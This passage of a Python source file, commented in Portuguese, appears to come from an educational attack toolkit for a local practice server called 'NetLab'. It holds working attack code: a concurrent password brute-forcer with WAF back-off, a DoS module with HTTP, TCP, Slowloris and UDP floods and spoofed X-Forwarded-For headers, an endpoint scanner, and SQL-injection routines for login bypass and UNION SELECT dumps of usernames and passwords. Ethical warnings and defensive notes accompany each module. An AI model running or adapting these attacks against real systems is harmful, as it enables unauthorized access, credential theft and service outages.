        elif _REQUESTS_OK:
            aviso("aiohttp não instalado — usando modo síncrono (requests).")
            dica("Instale aiohttp para maior velocidade: pip install aiohttp")
            self._sync_main()
        else:
            erro("Nenhuma biblioteca HTTP disponível.")
            dica("Execute: pip install aiohttp requests")

    # ── Motor assíncrono (aiohttp) ────────────────────────────────────────────

    async def _async_main(self) -> None:
        senhas     = list(self._senhas)
        total      = len(senhas)
        encontrado = asyncio.Event()

        fila: asyncio.Queue = asyncio.Queue(
            maxsize=min(self._concorrencia * 8, 50_000)
        )

        async def produtor() -> None:
            for s in senhas:
                if encontrado.is_set():
                    break
                await fila.put(s)
            for _ in range(self._concorrencia):
                await fila.put(None)

        conector = aiohttp.TCPConnector(
            limit=self._concorrencia,
            limit_per_host=self._concorrencia,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False,
        )
        timeout_obj = aiohttp.ClientTimeout(
            total=self._timeout,
            connect=min(self._timeout, 2.0),
        )

        async with aiohttp.ClientSession(
            connector=conector,
            timeout=timeout_obj,
        ) as sessao:

            tarefa_prod = asyncio.create_task(produtor())

            if _RICH_OK and console:
                prog = Progress(
                    SpinnerColumn(), "[cyan]Testando senhas...[/cyan]",
                    BarColumn(), TaskProgressColumn(),
                    MofNCompleteColumn(), TimeElapsedColumn(),
                    TimeRemainingColumn(), console=console, transient=True,
                )
                tid = prog.add_task("", total=total)
                prog.start()
            else:
                prog = tid = None

            workers = [
                asyncio.create_task(
                    self._worker(sessao, fila, encontrado, prog, tid)
                )
                for _ in range(self._concorrencia)
            ]

            tarefas = [tarefa_prod] + workers
            try:
                done, _ = await asyncio.wait(
                    tarefas,
                    return_when=asyncio.FIRST_EXCEPTION,
                )
                for t in done:
                    exc = t.exception() if not t.cancelled() else None
                    if isinstance(exc, _SenhaAchada):
                        if self._bypass_sqli is None:
                            self._resultado = exc.senha
                        break
            except Exception:
                pass
            finally:
                for t in tarefas:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*tarefas, return_exceptions=True)

            if prog:
                prog.stop()

    async def _worker(self, sessao, fila: asyncio.Queue,
                      encontrado: asyncio.Event, prog, tid) -> None:
        backoff = 1.0

        while not encontrado.is_set():
            senha = await fila.get()
            if senha is None or encontrado.is_set():
                return

            status, corpo, loc, set_cookie = await self._post_login(sessao, senha)

            if status is None:
                self._tentativas += 1
                self._erros += 1
                await fila.put(senha)
                await asyncio.sleep(backoff)
                continue

            self._tentativas += 1

            if prog and tid is not None:
                prog.update(tid, advance=1)

            if _detecta_bloqueio(status, corpo or ""):
                self._recusados += 1
                self._waf = True
                await asyncio.sleep(backoff)
                backoff = min(backoff * 1.5, 10.0)
                await fila.put(senha)
                continue
            else:
                backoff = 1.0

            if _login_bem_sucedido(status, corpo or "", loc or "", set_cookie or ""):
                if not encontrado.is_set():
                    encontrado.set()
                    usuario_real = _extrair_usuario_do_corpo(corpo or "")
                    eh_sqli = any(c in senha for c in ("'", "--", "OR", "UNION"))

                    if eh_sqli:
                        destaque(
                            f"\n\n  ⚠  VULNERABILIDADE SQLi — autenticou como '{usuario_real}'\n"
                            f"  Payload que funcionou: {senha}\n"
                            f"  O servidor não valida a entrada — bypass confirmado!\n"
                        )
                        self._bypass_sqli = senha
                    else:
                        destaque(
                            f"\n\n  ✓ SENHA ENCONTRADA!\n"
                            f"  Usuário: {self._usuario}   Senha: {_BOLD}{senha}{_RESET}\n"
                            f"  Usuário confirmado na página: {usuario_real or self._usuario}\n"
                        )
                        self._resultado = senha
                    raise _SenhaAchada(senha)

            if self._delay > 0:
                await asyncio.sleep(self._delay)

    async def _post_login(self, sessao, senha: str):
        try:
            proxy = self._proxy
            async with sessao.post(
                self._url_login,
                data={"usuario": self._usuario, "senha": senha},
                headers=_headers_extras(),
                proxy=proxy,
                allow_redirects=False,
            ) as resp:
                corpo = await resp.text(errors="ignore")
                return (
                    resp.status,
                    corpo,
                    resp.headers.get("Location", ""),
                    resp.headers.get("Set-Cookie", ""),
                )
        except Exception:
            return None, None, None, None

    # ── Motor síncrono (requests) ─────────────────────────────────────────────

    def _sync_main(self) -> None:
        import concurrent.futures
        import queue

        senhas = list(self._senhas)
        total  = len(senhas)
        fila   = queue.Queue()
        for s in senhas:
            fila.put(s)
        parar  = threading.Event()

        info(f"Iniciando ataque síncrono com {self._concorrencia} threads...")

        def worker() -> None:
            sess = _req.Session()
            while not parar.is_set() and not fila.empty():
                try:
                    senha = fila.get_nowait()
                except queue.Empty:
                    return
                try:
                    r = sess.post(
                        self._url_login,
                        data={"usuario": self._usuario, "senha": senha},
                        timeout=self._timeout,
                        allow_redirects=False,
                        headers=_headers_extras(),
                    )
                    self._tentativas += 1
                    
                    if _detecta_bloqueio(r.status_code, r.text):
                        self._recusados += 1
                        self._waf = True
                        if self._delay == 0.0:
                            time.sleep(1.0)
                        else:
                            time.sleep(max(1.0, self._delay * 1.5))
                        fila.put(senha)
                        continue

                    if _login_bem_sucedido(r.status_code, r.text,
                                           r.headers.get("Location", ""),
                                           r.headers.get("Set-Cookie", "")):
                        if not parar.is_set():
                            parar.set()
                            usuario_real = _extrair_usuario_do_corpo(r.text)
                            eh_sqli = any(c in senha for c in ("'", "--", "OR", "UNION"))

                            if eh_sqli:
                                destaque(
                                    f"\n\n  ⚠  BYPASS SQLi — autenticou como '{usuario_real}'\n"
                                    f"  Payload: {senha}\n"
                                )
                                self._bypass_sqli = senha
                            else:
                                destaque(
                                    f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}  "
                                    f"(usuário confirmado: {usuario_real or self._usuario})\n"
                                )
                                self._resultado = senha
                        return
                except Exception:
                    self._erros += 1
                if self._delay > 0:
                    time.sleep(self._delay)

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self._concorrencia
        ) as ex:
            concurrent.futures.wait([ex.submit(worker) for _ in range(self._concorrencia)])

    # ── Resultado ─────────────────────────────────────────────────────────────

    def mostrar_resultado(self) -> None:
        tps = self._tentativas / self._decorrido
        tabela_rich([
            ["Tentativas realizadas",  f"{self._tentativas:,}"],
            ["Erros / timeout",        f"{self._erros:,}"],
            ["Bloqueios detectados",   f"{self._recusados:,}"],
            ["Tempo total",            f"{self._decorrido:.2f}s"],
            ["Taxa média",             f"{tps:.1f} requisições/s"],
            ["WAF / rate limit ativo", "Sim — servidor bloqueou tentativas" if self._waf else "Não detectado"],
        ], ["Métrica", "Valor"], "Resultado — Força Bruta")

        if self._resultado:
            print(f"\n  {_VERDE}{_BOLD}{'═' * 56}")
            print(f"  ✓  SENHA VÁLIDA ENCONTRADA")
            print(f"     Usuário : {self._usuario}")
            print(f"     Senha   : {self._resultado}")
            print(f"  {'═' * 56}{_RESET}")
        elif self._bypass_sqli:
            print(f"\n  {_AMAR}{_BOLD}{'═' * 56}")
            print(f"  ⚠  VULNERABILIDADE SQL INJECTION CONFIRMADA")
            print(f"     Payload  : {self._bypass_sqli}")
            print(f"     Impacto  : bypass de autenticação sem senha válida")
            print(f"     Próximo  : use o Módulo 5 (SQL Injection) para extração de dados")
            print(f"  {'═' * 56}{_RESET}")
        else:
            erro("Nenhuma senha válida encontrada no espaço testado.")
            dica("Tente ampliar a wordlist ou usar a estratégia de força bruta total (opção 6).")

        if self._waf:
            aviso("Rate limiting foi detectado durante o ataque.")
            dica("O servidor NetLab original não possui limite — verifique se há outro bloqueio ativo.")

        _nota_educacional(
            "A ausência de bloqueio por tentativas (rate limiting) é uma falha grave de segurança. "
            "Um servidor protegido deve bloquear IPs após 5 a 10 tentativas incorretas, "
            "utilizar CAPTCHA após falhas repetidas e registrar todas as tentativas em log."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 2 — Teste de Estresse / DoS
# ══════════════════════════════════════════════════════════════════════════════

class ModuloEstresse(BaseAtaque):
    """HTTP flood / TCP flood / Slowloris / UDP flood."""

    _DURACAO_MAX = 300

    def __init__(self) -> None:
        super().__init__()
        self._ip:           str   = "127.0.0.1"
        self._porta:        int   = 8080
        self._host:         str   = "localhost"
        self._tipo:         str   = "http"
        self._concorrencia: int   = 200
        self._timeout:      float = 2.0
        self._duracao:      float = 30.0
        self._repeticoes:   int   = 20

    def configurar(self) -> None:
        _aviso_etico_modulo("Teste de Estresse / DoS")
        _cabecalho_modulo(
            titulo="Módulo 2 — Teste de Estresse / DoS",
            descricao="Sobrecarga o servidor com requisições para avaliar limites.",
            risco="MUITO ALTO — pode derrubar o servidor durante a demonstração",
            cor_risco=_VERM,
        )

        # ── Tipo de ataque ─────────────────────────────────────────────────────
        print(f"  {_CIANO}{_BOLD}Tipos de ataque disponíveis:{_RESET}\n")
        tipos_desc = [
            ("http",      "GET flood assíncrono",
             "Envia muitas requisições HTTP GET paralelas"),
            ("tcp",       "TCP flood bruto",
             "Abre e fecha conexões TCP sem enviar HTTP completo"),
            ("slowloris", "Slowloris — headers incompletos",
             "Mantém conexões abertas sem completar o request (esgota threads)"),
            ("udp",       "UDP flood",
             "Envia datagramas UDP aleatórios (afeta serviços sem conexão)"),
        ]
        for tipo, nome, descricao in tipos_desc:
            print(f"    {_BOLD}{tipo:<12}{_RESET} {_CIANO}{nome}{_RESET}")
            print(f"                 {_DIM}{descricao}{_RESET}\n")

        # ── Configuração do alvo ───────────────────────────────────────────────
        alvo = entrada(
            "IP ou hostname alvo",
            "localhost",
            dica_extra="Deve ser o servidor NetLab local. Nunca use IPs externos.",
        )
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", alvo):
            self._ip = alvo
        else:
            try:
                self._ip = socket.gethostbyname(alvo)
                ok(f"{alvo} resolvido para {self._ip}")
            except socket.gaierror:
                aviso(f"Não foi possível resolver '{alvo}' — usando 127.0.0.1")
                self._ip = "127.0.0.1"
        self._host = alvo

        self._porta = int(entrada(
            "Porta do servidor",
            "8080",
            dica_extra="Porta padrão do NetLab: 8080",
        ))
        tipo = entrada(
            "Tipo de ataque (http / tcp / slowloris / udp)",
            "http",
        ).lower()
        if tipo not in ("http", "tcp", "slowloris", "udp"):
            aviso(f"Tipo '{tipo}' não reconhecido — usando 'http' como padrão.")
            tipo = "http"
        self._tipo = tipo

        self._concorrencia = max(1, min(
            int(entrada(
                f"Conexões simultâneas (máximo {_MAX_STRESS_CONCORRENCIA})",
                "300",
                dica_extra="Valores acima de 500 podem derrubar o servidor imediatamente.",
            )),
            _MAX_STRESS_CONCORRENCIA,
        ))
        self._timeout  = max(0.1, float(entrada(
            "Timeout por conexão em segundos",
            "3.0",
        )))
        dur = float(entrada(
            f"Duração total do teste em segundos (máximo {self._DURACAO_MAX})",
            "30",
            dica_extra=f"Máximo permitido: {self._DURACAO_MAX}s. Use valores pequenos para demonstração.",
        ))
        self._duracao  = max(1, min(dur, self._DURACAO_MAX))
        self._repeticoes = max(1, int(entrada(
            "Repetições por worker",
            "20",
            dica_extra="Quantas vezes cada worker repete o ataque durante a duração.",
        )))

        tabela_rich([
            ["Alvo",        f"{self._ip}:{self._porta} ({self._host})"],
            ["Tipo",        self._tipo.upper()],
            ["Paralelo",    f"{self._concorrencia} workers simultâneos"],
            ["Duração",     f"{self._duracao:.0f}s"],
            ["Repetições",  f"{self._repeticoes} por worker"],
            ["Timeout",     f"{self._timeout}s por conexão"],
        ], ["Parâmetro", "Valor Configurado"], "Resumo da Configuração — Estresse")

    def executar(self) -> None:
        asyncio.run(self._async_main())

    async def _async_main(self) -> None:
        loop      = asyncio.get_event_loop()
        tempo_fim = loop.time() + self._duracao
        sem       = asyncio.Semaphore(self._concorrencia)

        print(f"\n  {_AMAR}Iniciando: {self._tipo.upper()} → {self._ip}:{self._porta}")
        info(f"  {self._concorrencia} workers · {self._duracao:.0f}s de duração")
        info("  Pressione Ctrl+C para interromper a qualquer momento.\n")

        tarefa_stats = asyncio.create_task(self._stats_loop(tempo_fim))

        sock_udp: Optional[socket.socket] = None
        if self._tipo == "udp":
            try:
                sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except Exception as e:
                erro(f"Falha ao criar socket UDP: {e}")
                return

        total_tarefas = self._concorrencia * self._repeticoes
        todas: list = []

        try:
            for i in range(0, total_tarefas, _LOTE_STRESS):
                if loop.time() >= tempo_fim:
                    break
                lote_n = min(_LOTE_STRESS, total_tarefas - i)
                lote = [
                    asyncio.create_task(self._despachar(sem, tempo_fim, sock_udp))
                    for _ in range(lote_n)
                ]
                todas.extend(lote)
                await asyncio.sleep(0)

            await asyncio.gather(*todas, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            aviso("\n  Teste interrompido pelo usuário.")
            for t in todas:
                t.cancel()
        finally:
            if sock_udp:
                sock_udp.close()
            tarefa_stats.cancel()
            sys.stdout.write("\n")
            sys.stdout.flush()

    async def _despachar(self, sem: asyncio.Semaphore,
                          tempo_fim: float,
                          sock_udp: Optional[socket.socket]) -> None:
        if asyncio.get_event_loop().time() >= tempo_fim:
            return
        async with sem:
            if asyncio.get_event_loop().time() >= tempo_fim:
                return
            try:
                if self._tipo == "tcp":
                    await self._tcp()
                elif self._tipo == "udp":
                    self._udp(sock_udp)
                elif self._tipo == "slowloris":
                    await self._slowloris()
                else:
                    await self._http_flood()
            except Exception:
                self._erros += 1

    async def _http_flood(self) -> None:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        req = (
            f"GET / HTTP/1.1\r\nHost: {self._host}\r\n"
            f"User-Agent: {_ua()}\r\n"
            f"X-Forwarded-For: {_ip_falso()}\r\n"
            "Accept: text/html\r\nConnection: close\r\n\r\n"
        ).encode("ascii")
        w.write(req)
        await w.drain()
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        self._tentativas += 1

    async def _tcp(self) -> None:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        w.write(b"GET / HTTP/1.0\r\n\r\n")
        await w.drain()
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        self._tentativas += 1

    def _udp(self, sock: Optional[socket.socket]) -> None:
        if sock is None:
            raise RuntimeError("Socket UDP não inicializado — bug interno.")
        sock.sendto(os.urandom(1024), (self._ip, self._porta))
        self._tentativas += 1

    async def _slowloris(self) -> None:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        w.write((
            f"GET / HTTP/1.1\r\n"
            f"Host: {self._host}\r\n"
            f"User-Agent: {_ua()}\r\n"
            f"X-Forwarded-For: {_ip_falso()}\r\n"
            "Accept-Language: pt-BR,pt;q=0.9\r\n"
        ).encode())
        await w.drain()
        for _ in range(8):
            w.write(f"X-Keep: {random.randint(1, 9999)}\r\n".encode())
            await w.drain()
            await asyncio.sleep(random.uniform(0.4, 1.2))
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        self._tentativas += 1

    async def _stats_loop(self, tempo_fim: float) -> None:
        """Exibe estatísticas de progresso em tempo real no terminal."""
        loop = asyncio.get_event_loop()
        ini  = loop.time()
        while loop.time() < tempo_fim:
            passado  = max(loop.time() - ini, 1e-9)
            restante = max(tempo_fim - loop.time(), 0)
            tps      = self._tentativas / passado
            sys.stdout.write(
                f"\r  [Enviados: {self._tentativas:>7,}]  "
                f"[Recusados: {self._recusados:>5,}]  "
                f"[Erros: {self._erros:>5,}]  "
                f"[{tps:>7.1f} req/s]  "
                f"[Restante: {restante:>4.0f}s]   "
            )
            sys.stdout.flush()
            await asyncio.sleep(1)

    def mostrar_resultado(self) -> None:
        tps = self._tentativas / max(self._duracao, 1)
        tabela_rich([
            ["Tipo de ataque",    self._tipo.upper()],
            ["Requisições enviadas",  f"{self._tentativas:,}"],
            ["Conexões recusadas",    f"{self._recusados:,}"],
            ["Erros",                 f"{self._erros:,}"],
            ["Duração",               f"{self._duracao:.0f}s"],
            ["Taxa média",            f"{tps:.1f} req/s"],
        ], ["Métrica", "Valor"], "Resultado — Teste de Estresse")
        info("Verifique a aba 'Servidor' no NetLab para ver a barra de carga e req/s em tempo real.")

        _nota_educacional(
            "Servidores de produção devem implementar rate limiting por IP, "
            "circuit breakers e monitoramento de carga para mitigar ataques de DoS. "
            "O Slowloris é especialmente perigoso pois usa poucos recursos do atacante."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 3 — Scanner de Endpoints
# ══════════════════════════════════════════════════════════════════════════════

class ModuloScanner(BaseAtaque):
    """Enumera endpoints e analisa headers de segurança."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base:     str   = "http://localhost:8080"
        self._concorrencia: int   = 15
        self._timeout:      float = 3.0
        self._resultados:   List[dict] = []

    def configurar(self) -> None:
        _aviso_etico_modulo("Scanner de Endpoints")
        _cabecalho_modulo(
            titulo="Módulo 3 — Scanner de Endpoints",
            descricao=f"Enumera {len(_ENDPOINTS)} rotas e analisa headers de segurança HTTP.",
            risco="MÉDIO — apenas leitura, não modifica dados",
            cor_risco=_AMAR,
        )
        self._url_base    = entrada(
            "URL base do servidor",
            "http://localhost:8080",
            dica_extra="Ex: http://localhost:8080 ou http://192.168.1.5:8080",
        ).rstrip("/")
        self._concorrencia = min(int(entrada(
            "Requisições paralelas (máximo 30)",
            "15",
            dica_extra="Valores altos podem gerar erros de timeout.",
        )), 30)
        self._timeout     = max(0.1, float(entrada(
            "Timeout por endpoint em segundos",
            "2.5",
        )))
        ok(f"Escaneando {len(_ENDPOINTS)} endpoints em {self._url_base}")

    def executar(self) -> None:
        print(f"\n  {_DIM}Legenda de status:{_RESET}")
        print(f"    {_VERDE}✓{_RESET} 200/201   — endpoint ativo e acessível")
        print(f"    {_AMAR}→{_RESET} 301/302   — redirecionamento")
        print(f"    {_DIM}·{_RESET} 404       — não encontrado")
        print(f"    {_MAG}⊘{_RESET} 429       — bloqueado (rate limit)")
        print(f"    {_VERM}✗{_RESET} erro      — falha de conexão")
        print(f"\n  {_DIM}{'─' * 50}{_RESET}\n")

        if _AIOHTTP_OK:
            asyncio.run(self._async_main())
        elif _REQUESTS_OK:
            self._sync_main()
        else:
            erro("Nenhuma biblioteca HTTP disponível.")
            dica("Execute: pip install aiohttp requests")

    async def _async_main(self) -> None:
        sem = asyncio.Semaphore(self._concorrencia)
        connector  = aiohttp.TCPConnector(ssl=False)
        timeout_ob = aiohttp.ClientTimeout(total=self._timeout)
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout_ob
        ) as sess:
            tarefas = [
                asyncio.create_task(self._scan_ep(sess, sem, ep))
                for ep in _ENDPOINTS
            ]
            await asyncio.gather(*tarefas, return_exceptions=True)

    async def _scan_ep(self, sess, sem, ep: str) -> None:
        url = self._url_base + ep
        async with sem:
            try:
                async with sess.get(
                    url, allow_redirects=False,
                    headers={"User-Agent": _ua()},
                ) as resp:
                    hdrs = dict(resp.headers)
                    self._registrar(ep, resp.status, hdrs)
                    self._tentativas += 1
            except Exception as e:
                self._registrar(ep, 0, {}, str(e))
                self._erros += 1

    def _sync_main(self) -> None:
        sess = _req.Session()
        for ep in _ENDPOINTS:
            url = self._url_base + ep
            try:
                r = sess.get(url, timeout=self._timeout, allow_redirects=False,
                             headers={"User-Agent": _ua()})
                self._registrar(ep, r.status_code, dict(r.headers))
                self._tentativas += 1
            except Exception as e:
                self._registrar(ep, 0, {}, str(e))
                self._erros += 1

    def _registrar(self, ep: str, status: int,
                   hdrs: dict, msg_erro: str = "") -> None:
        _HDRS_SEG = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options",
        ]
        ausentes = [h for h in _HDRS_SEG if h not in hdrs]
        self._resultados.append({
            "endpoint": ep, "status": status, "ausentes": ausentes,
            "server":   hdrs.get("Server", ""), "erro": msg_erro,
        })

        if status == 0:
            cor, s = _VERM,      "✗"
        elif status in (200, 201):
            cor, s = _VERDE,     "✓"
        elif status in (301, 302, 307):
            cor, s = _AMAR,      "→"
        elif status == 404:
            cor, s = "\033[90m", "·"
        elif status == 429:
            cor, s = _MAG,       "⊘"
        else:
            cor, s = _CIANO,     "?"

        servidor = f"  (Server: {hdrs['Server'][:28]})" if hdrs.get("Server") else ""
        print(f"  {cor}{s}{_RESET}  {str(status) if status else 'ERR':>3}  {ep:<28}{servidor}")

    def mostrar_resultado(self) -> None:
        ativos  = [r for r in self._resultados if r["status"] in (200, 201, 302, 301)]
        alertas = [r for r in ativos if r["ausentes"]]

        if alertas:
            print(f"\n  {_AMAR}{_BOLD}Headers de segurança ausentes nos endpoints ativos:{_RESET}")
            for r in alertas:
                print(f"\n    {_CIANO}{r['endpoint']}{_RESET}")
                for h in r["ausentes"]:
                    print(f"      {_VERM}✗{_RESET} {h} — não configurado")

        tabela_rich([
            ["Endpoints testados",     str(len(_ENDPOINTS))],
            ["Ativos (2xx / 3xx)",     str(len(ativos))],
            ["Com headers ausentes",   str(len(alertas))],
            ["Erros de conexão",       str(self._erros)],
            ["Tempo total",            f"{self._decorrido:.2f}s"],
        ], ["Métrica", "Valor"], "Resultado — Scanner de Endpoints")

        if ativos:
            info("Endpoints acessíveis encontrados:")
            for r in ativos:
                print(f"    {r['endpoint']}  [{r['status']}]")

        _nota_educacional(
            "Headers de segurança como Content-Security-Policy e X-Frame-Options "
            "são medidas defensivas essenciais contra XSS e clickjacking. "
            "Sua ausência é uma fraqueza que amplia o impacto de outras vulnerabilidades."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 4 — Interceptação HTTP
# ══════════════════════════════════════════════════════════════════════════════

class ModuloIntercepcaoHTTP(BaseAtaque):
    """Submete formulários e exibe o payload em texto puro (como um sniffer veria)."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base:   str = "http://localhost:8080"
        self._repeticoes: int = 3

    def configurar(self) -> None:
        _aviso_etico_modulo("Interceptação HTTP")
        _cabecalho_modulo(
            titulo="Módulo 4 — Interceptação HTTP",
            descricao="Mostra credenciais e dados de formulário visíveis na rede sem criptografia.",
            risco="INFORMATIVO — demonstra visibilidade de dados em texto puro",
            cor_risco=_AMAR,
        )
        self._url_base   = entrada(
            "URL base do servidor",
            "http://localhost:8080",
            dica_extra="O servidor precisa estar rodando e acessível.",
        ).rstrip("/")
        self._repeticoes = int(entrada(
            "Quantidade de formulários a enviar na demonstração",
            "3",
            dica_extra="Cada envio simula um usuário diferente. Recomendado: 3 a 5.",
        ))

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("biblioteca 'requests' não instalada.")
            dica("Execute: pip install requests")
            return

        demos = [
            ("/login",      {"usuario": "alice",   "senha": "alice123"}),
            ("/login",      {"usuario": "admin",   "senha": "123456"}),
            ("/register",   {"usuario": "teste",   "senha": "1234",
                             "confirmar": "1234"}),
            ("/comentarios", {"conteudo": "Olá mundo — interceptação demo"}),
        ]

        print(f"\n  {_AMAR}Enviando dados sensíveis via HTTP sem criptografia...{_RESET}")
        print(f"  {_DIM}Abra o Modo Análise no NetLab para ver os pacotes em tempo real.{_RESET}")
        print(f"\n  {'─' * 62}")

        sess = _req.Session()
        try:
            sess.post(self._url_base + "/login",
                      data={"usuario": "alice", "senha": "alice123"},
                      timeout=4, allow_redirects=False)
        except Exception:
            pass

        for i in range(self._repeticoes):
            ep, dados = demos[i % len(demos)]
            url = self._url_base + ep
            corpo_raw = "&".join(f"{k}={v}" for k, v in dados.items())

            print(f"\n  {_BOLD}Requisição #{i + 1} de {self._repeticoes}:{_RESET}")
            print(f"    {_VERM}POST {url} HTTP/1.1{_RESET}")
            print(f"    Content-Type: application/x-www-form-urlencoded")
            print(f"    {_AMAR}Payload visível na rede (qualquer sniffer captura isso):{_RESET}")
            print(f"    {_VERM}{_BOLD}  {corpo_raw}{_RESET}")

            try:
                r = sess.post(url, data=dados, timeout=4.0, allow_redirects=False,
                              headers=_headers_extras())
                ok(f"Servidor respondeu: HTTP {r.status_code}")
            except Exception as e:
                erro(f"Falha ao enviar: {e}")

            self._tentativas += 1
            time.sleep(0.4)

        print(f"\n  {'─' * 62}")
        aviso("Todos os campos acima estavam legíveis na rede sem nenhuma proteção.")
        info("Ative o Modo Análise no NetLab para confirmar a captura em tempo real.")

    def mostrar_resultado(self) -> None:
        tabela_rich([
            ["Formulários enviados", str(self._tentativas)],
            ["Protocolo",            "HTTP — sem criptografia"],
            ["Visibilidade",         "TOTAL — credenciais em texto puro"],
            ["Mitigação",            "HTTPS obrigatório + HSTS"],
        ], ["Item", "Detalhe"], "Resultado — Interceptação HTTP")

        _nota_educacional(
            "HTTPS cifra todo o conteúdo dos formulários antes de enviá-los. "
            "Com HSTS (HTTP Strict Transport Security), o navegador recusa "
            "qualquer tentativa de downgrade para HTTP, "
            "bloqueando ataques Man-in-the-Middle ativos."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 5 — SQL Injection
# ══════════════════════════════════════════════════════════════════════════════

class ModuloSQLInjection(BaseAtaque):
    """
    Explora SQLi em dois vetores:
      • /login     — bypass de autenticação por concatenação direta
      • /produtos  — UNION SELECT para dump da tabela users
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:       str        = ""
        self._bypass_login:   bool       = True
        self._dump_users:     bool       = True
        self._resultados:     List[dict] = []

    def configurar(self) -> None:
        _aviso_etico_modulo("SQL Injection")
        _cabecalho_modulo(
            titulo="Módulo 5 — SQL Injection",
            descricao="Explora concatenação SQL direta para autenticar e extrair dados.",
            risco="CRÍTICO — obtém acesso não autorizado e extrai senhas do banco",
            cor_risco=_VERM,
        )
        self._url_base    = entrada(
            "URL base do servidor",
            "http://localhost:8080",
        ).rstrip("/")
        testar_conectividade(self._url_base)

        self._bypass_login = entrada(
            "Testar bypass de autenticação via SQL Injection? (S/n)",
            "s",
            dica_extra="Testa payloads em /login para autenticar sem senha.",
        ).lower().startswith("s")

        self._dump_users = entrada(
            "Extrair tabela 'users' via UNION SELECT? (S/n)",
            "s",
            dica_extra="Usa injeção em /produtos?id= para listar usuários e senhas.",
        ).lower().startswith("s")

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("biblioteca 'requests' não instalada.")
            dica("Execute: pip install requests")
            return
        if self._bypass_login:
            self._fase_bypass()
        if self._dump_users:
            self._fase_dump()

    def _confirmar_bypass_sqli(
        self,
        status: int,
        corpo: str,
        location: str,
        set_cookie: str,
    ) -> Tuple[bool, str]:
        """
        Valida bypass SQLi com dois critérios independentes para evitar falsos positivos.
        Retorna (sucesso, nome_usuario).
        """
        html_ok    = _login_bem_sucedido(status, corpo, location, set_cookie)
        cookie_ok  = "sessao=token" in set_cookie.lower() or "session=" in set_cookie.lower()
        usuario    = _extrair_usuario_do_corpo(corpo) if html_ok else ""

        if html_ok and cookie_ok:
            return True, usuario or "admin"

        if html_ok and not cookie_ok:
            aviso(f"HTML indica sucesso mas Set-Cookie ausente — descartando como falso positivo.")
            return False, ""

        return False, ""

    def _fase_bypass(self) -> None:
        fase(1, "Bypass de autenticação via SQL Injection")
        sess = _req.Session()

        for payload in _SQLI_BYPASS:
            try:
                r = sess.post(
                    self._url_base + "/login",
                    data={"usuario": "admin", "senha": payload},
                    timeout=5,
                    allow_redirects=False,
                    headers=_headers_extras(),
                )
                status_code = r.status_code
                corpo       = r.text
                location    = r.headers.get("Location", "")
                set_cookie  = r.headers.get("Set-Cookie", "")

                sucesso, usuario = self._confirmar_bypass_sqli(
                    status_code, corpo, location, set_cookie
                )

                if sucesso:
                    ok(f"Bypass confirmado com payload: {payload!r}")
                    ok(f"Autenticado como: {usuario}")
                    self._resultados.append(EvidenciaAtaque(
                        tipo="bypass_sqli",
                        endpoint="/login",
                        payload=payload,
                        status_http=status_code,
                        set_cookie=set_cookie,
                        usuario=usuario,
                        conclusao="Login realizado sem senha válida",
                        confianca="ALTA",
                    ))
                    return
                else:
                    print(f"  {_DIM}· Payload sem efeito: {payload[:50]}{_RESET}")

                self._tentativas += 1
                time.sleep(0.15)
            except Exception as e:
                erro(f"Erro ao enviar payload: {e}")

        aviso("Nenhum bypass funcionou. O servidor pode ter proteção adicional.")

    def _fase_dump(self) -> None:
        fase(2, "Extração de dados via UNION SELECT")

        n_cols = self._descobrir_colunas()
        info(f"Colunas detectadas na query original: {n_cols}")

        if n_cols < 2:
            aviso("Não foi possível detectar colunas automaticamente — usando 3 (padrão).")
            n_cols = 3

        payloads_dump = [
            f" UNION SELECT 1,(SELECT group_concat(username||':'||password||':'||role,'|') FROM users),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 0),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 1),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 2),1--",
            f" UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1 OFFSET 3),1--",
        ]

        dados_extraidos: List[str] = []
        for payload in payloads_dump:
            resultado = self._injetar(payload)
            if resultado:
                ok(f"Dados extraídos com sucesso: {resultado}")
                dados_extraidos.append(resultado)
                self._resultados.append({"tipo": "dump", "dados": resultado})
                if "|" in resultado or ":" in resultado:
                    break
            self._tentativas += 1
            time.sleep(0.2)

        if not dados_extraidos:
            tabelas = self._injetar(
                " UNION SELECT 1,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),1--"
            )
            if tabelas:
                info(f"Tabelas encontradas no banco: {tabelas}")
            erro("Não foi possível extrair dados da tabela users nesta tentativa.")
            dica("Verifique se o servidor está rodando e tente novamente.")

    def _descobrir_colunas(self) -> int:
        """Usa ORDER BY para detectar quantas colunas existem na query original."""
        for i in range(1, 10):
            try:
                r = _req.get(
                    self._url_base + f"/produtos?id=1 ORDER BY {i}--",
                    timeout=4, headers=_headers_extras(),
                )
                if r.status_code != 200 or "Erro interno" in r.text:
                    return i - 1
            except Exception:
                return i - 1
        return 3

